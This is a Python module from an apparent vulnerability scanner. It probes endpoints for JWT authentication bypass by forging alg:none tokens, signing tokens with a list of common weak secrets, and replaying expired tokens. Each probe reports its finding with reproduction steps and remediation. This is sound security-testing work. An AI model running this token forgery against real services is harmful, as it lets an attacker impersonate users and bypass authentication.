"""JWT authentication-bypass attack module - section 2.3 of the spec.

Three independent probes per configured endpoint:

  1. `alg:none` acceptance (CWE-347, critical):
     forge a token with header `{"alg":"none","typ":"JWT"}` and an empty
     signature segment. A correctly-configured library rejects this
     outright; libraries called without an explicit algorithm allowlist
     happily accept it.

  2. Weak shared signing secret (CWE-798, high):
     attempt HS256 forgery against a small list of common default secrets
     (`"secret"`, `"password"`, `""`, `"your-256-bit-secret"`, ...). A
     200 response means the signing key is trivially guessable.

  3. Expired-token acceptance (CWE-613, high):
     forge a token with `exp` ~1h in the past, using whichever bypass
     mechanism is already known to work (weak secret preferred, else
     alg:none). 200 means the server is not enforcing `exp` independently
     of the bypass - replayed tokens stay valid indefinitely.

Probes share the legitimate user's payload as a base so the `sub` claim
references a real user id.

Out of scope for this iteration (could be added with their own probes):
  - Algorithm substitution (RS256 → HS256 with public key): requires the
    target to use RS256, which BrokenCheckout does not.
  - Token reuse after logout: BrokenCheckout has no logout endpoint.
  - Token entropy / brute force.
  - Session fixation.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any, Optional

import httpx
import structlog

from core.models import AuthEndpoint, AuthModuleConfig, Finding
from core.session import ScanContext

log = structlog.get_logger(__name__)

USER_AGENT = "Fracture/1.0"

COMMON_WEAK_SECRETS: list[str] = [
    "",
    "secret",
    "key",
    "password",
    "test",
    "jwt-secret",
    "secret-key",
    "supersecret",
    "changeme",
    "default",
    "your-256-bit-secret",
    "your-secret",
    "1234",
]


# --- JWT primitives (no library: we need to forge invalid tokens) -----------


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def _decode_unsafe(token: str) -> tuple[dict, dict]:
    """Decode without verifying - we just need access to the claims to clone them."""
    h, p, _ = token.split(".")
    return json.loads(_b64url_decode(h)), json.loads(_b64url_decode(p))


def _encode_unsigned(header: dict, payload: dict) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _encode_hs256(payload: dict, secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


# --- request helper ---------------------------------------------------------


def _safe_json(resp: httpx.Response) -> Any:
    try:
        return resp.json()
    except Exception:
        return resp.text[:500]


async def _send(
    client: httpx.AsyncClient,
    base_url: str,
    endpoint: AuthEndpoint,
    token: Optional[str],
) -> httpx.Response:
    headers = {"User-Agent": USER_AGENT}
    if token is not None:
        headers["Authorization"] = f"Bearer {token}"
    url = base_url.rstrip("/") + endpoint.path
    return await client.request(endpoint.method, url, headers=headers)


def _redact_token(token: str) -> str:
    """Tokens go into evidence verbatim, but rep-steps quote the header/payload
    instead of pasting raw 500-char b64 strings."""
    if len(token) <= 40:
        return token
    return token[:20] + "..." + token[-12:]


# --- probes -----------------------------------------------------------------


async def _probe_alg_none(
    client: httpx.AsyncClient,
    base_url: str,
    endpoint: AuthEndpoint,
    payload: dict,
) -> tuple[bool, list[Finding]]:
    """Returns (alg_none_accepted, findings)."""
    forged = _encode_unsigned({"alg": "none", "typ": "JWT"}, payload)
    resp = await _send(client, base_url, endpoint, forged)
    if resp.status_code != 200:
        log.info(
            "auth_alg_none_rejected",
            endpoint=endpoint.path,
            status=resp.status_code,
        )
        return False, []

    finding = Finding(
        module="auth",
        severity="critical",
        title=f"JWT alg:none accepted on {endpoint.path}",
        description=(
            "The endpoint accepts a JWT whose header specifies `alg: \"none\"`, "
            "bypassing signature verification entirely. Any attacker with a valid "
            "user id can forge a token for that user without possessing any signing "
            "secret. This is the canonical jwt-library algorithm-confusion flaw."
        ),
        evidence={
            "request": {
                "method": endpoint.method,
                "url": endpoint.path,
                "headers": {"Authorization": f"Bearer {forged}"},
            },
            "forged_header": {"alg": "none", "typ": "JWT"},
            "forged_payload": payload,
            "response_status": resp.status_code,
            "response_body_excerpt": _safe_json(resp),
        },
        cwe_id="CWE-347",
        reproduction_steps=[
            'Build a JWT header `{"alg":"none","typ":"JWT"}` and base64url-encode it',
            "Base64url-encode any payload containing a valid `sub` claim "
            f"(used here: {payload})",
            "Concatenate as `<header>.<payload>.` (note the trailing dot - empty signature)",
            f"Send {endpoint.method} {endpoint.path} with header "
            f"`Authorization: Bearer <token>` (token: `{_redact_token(forged)}`)",
            "Observe HTTP 200 - the server skipped signature verification",
        ],
        remediation=(
            "Reject any token whose `alg` header is `none`. In PyJWT, always pass an "
            "explicit `algorithms=[\"HS256\"]` (or whichever algorithm you use) to "
            "`jwt.decode()` - never omit it. The same fix applies to jose, "
            "jsonwebtoken, and similar libraries across stacks."
        ),
        endpoint=endpoint.path,
    )
    return True, [finding]


async def _probe_weak_secret(
    client: httpx.AsyncClient,
    base_url: str,
    endpoint: AuthEndpoint,
    payload: dict,
) -> tuple[Optional[str], list[Finding]]:
    """Returns (discovered_secret_or_none, findings)."""
    # Force a fresh, valid exp so a 200 here proves secret-guess, not exp-bypass.
    forged_payload = dict(payload)
    forged_payload["iat"] = int(time.time())
    forged_payload["exp"] = int(time.time()) + 3600

    for secret in COMMON_WEAK_SECRETS:
        token = _encode_hs256(forged_payload, secret)
        resp = await _send(client, base_url, endpoint, token)
        if resp.status_code == 200:
            log.info(
                "auth_weak_secret_found",
                endpoint=endpoint.path,
                secret=repr(secret),
            )
            finding = Finding(
                module="auth",
                severity="high",
                title=f"JWT signed with weak/guessable secret on {endpoint.path}",
                description=(
                    f"The endpoint accepted an HS256-signed JWT forged with the "
                    f"trivially-guessable secret {secret!r} (drawn from a list of "
                    f"{len(COMMON_WEAK_SECRETS)} common defaults). An attacker who "
                    f"guesses the signing key can mint tokens for any user."
                ),
                evidence={
                    "request": {
                        "method": endpoint.method,
                        "url": endpoint.path,
                        "headers": {"Authorization": f"Bearer {token}"},
                    },
                    "forged_payload": forged_payload,
                    "guessed_secret": secret,
                    "secrets_attempted_count": len(COMMON_WEAK_SECRETS),
                    "response_status": resp.status_code,
                    "response_body_excerpt": _safe_json(resp),
                },
                cwe_id="CWE-798",
                reproduction_steps=[
                    f"Forge an HS256 token with payload {forged_payload} "
                    f"signed using secret {secret!r}",
                    f"Send {endpoint.method} {endpoint.path} with "
                    f"`Authorization: Bearer <token>` (token: `{_redact_token(token)}`)",
                    "Observe HTTP 200 - the signing key is in a small enumerable set",
                ],
                remediation=(
                    "Generate a high-entropy signing key with `secrets.token_bytes(32)` "
                    "or equivalent, store it in a secrets manager (never in source or "
                    "container env files committed to git), and rotate it on a schedule. "
                    "For multi-service deployments consider an asymmetric algorithm "
                    "(RS256/EdDSA) so the verification key can be public while the "
                    "signing key stays private to the issuer."
                ),
                endpoint=endpoint.path,
            )
            return secret, [finding]

    log.info(
        "auth_weak_secret_not_found",
        endpoint=endpoint.path,
        tried=len(COMMON_WEAK_SECRETS),
    )
    return None, []


async def _probe_expired_token(
    client: httpx.AsyncClient,
    base_url: str,
    endpoint: AuthEndpoint,
    payload: dict,
    alg_none_works: bool,
    weak_secret: Optional[str],
) -> list[Finding]:
    """Test exp enforcement using whichever bypass already works."""
    expired_payload = dict(payload)
    expired_payload["iat"] = int(time.time()) - 7200
    expired_payload["exp"] = int(time.time()) - 3600  # 1h in the past

    if weak_secret is not None:
        token = _encode_hs256(expired_payload, weak_secret)
        method_label = f"HS256 signed with discovered weak secret {weak_secret!r}"
    elif alg_none_works:
        token = _encode_unsigned({"alg": "none", "typ": "JWT"}, expired_payload)
        method_label = "alg:none (no signature)"
    else:
        log.info(
            "auth_expired_skipped",
            endpoint=endpoint.path,
            reason="no token-forging mechanism available; cannot independently verify exp validation",
        )
        return []

    resp = await _send(client, base_url, endpoint, token)
    if resp.status_code != 200:
        log.info(
            "auth_expired_rejected",
            endpoint=endpoint.path,
            status=resp.status_code,
        )
        return []

    exp_age = int(time.time()) - expired_payload["exp"]
    return [
        Finding(
            module="auth",
            severity="high",
            title=f"Expired JWT accepted on {endpoint.path}",
            description=(
                f"The endpoint accepted a JWT whose `exp` claim is {exp_age} seconds "
                f"in the past (token forged via {method_label}). The handler is not "
                f"enforcing token expiry - a leaked or replayed token remains valid "
                f"indefinitely."
            ),
            evidence={
                "request": {
                    "method": endpoint.method,
                    "url": endpoint.path,
                    "headers": {"Authorization": f"Bearer {token}"},
                },
                "forged_payload": expired_payload,
                "forging_method": method_label,
                "exp_age_seconds": exp_age,
                "response_status": resp.status_code,
                "response_body_excerpt": _safe_json(resp),
            },
            cwe_id="CWE-613",
            reproduction_steps=[
                f"Forge a JWT via {method_label} with `exp` set to a timestamp "
                "approximately one hour in the past",
                f"Send {endpoint.method} {endpoint.path} with "
                f"`Authorization: Bearer <token>` (token: `{_redact_token(token)}`)",
                f"Observe HTTP 200 despite the expired claim ({exp_age}s old)",
            ],
            remediation=(
                "Validate `exp` on every request. With PyJWT, `jwt.decode()` enforces "
                "`exp` automatically when the claim is present; never pass "
                "`options={\"verify_exp\": False}`. Also enforce `nbf` (not-before) and "
                "consider a hard maximum token age (e.g. reject any token with `iat` "
                "older than 24h regardless of `exp`)."
            ),
            endpoint=endpoint.path,
        )
    ]


# --- entry point ------------------------------------------------------------


async def run_auth(ctx: ScanContext, config: AuthModuleConfig) -> list[Finding]:
    if not ctx.tokens:
        log.warning("auth_skipped", reason="no authenticated sessions / tokens available")
        return []
    if ctx.raw_client is None:
        log.warning("auth_skipped", reason="raw client not initialized")
        return []

    user_name = ctx.first_user()
    baseline_token = ctx.tokens[user_name]
    try:
        _, base_payload = _decode_unsafe(baseline_token)
    except Exception as exc:
        log.error("auth_baseline_decode_failed", error=str(exc))
        return []

    findings: list[Finding] = []
    for endpoint in config.endpoints:
        alg_none_ok, f1 = await _probe_alg_none(
            ctx.raw_client, ctx.base_url, endpoint, base_payload
        )
        findings.extend(f1)

        weak_secret, f2 = await _probe_weak_secret(
            ctx.raw_client, ctx.base_url, endpoint, base_payload
        )
        findings.extend(f2)

        findings.extend(
            await _probe_expired_token(
                ctx.raw_client,
                ctx.base_url,
                endpoint,
                base_payload,
                alg_none_ok,
                weak_secret,
            )
        )

    return findings
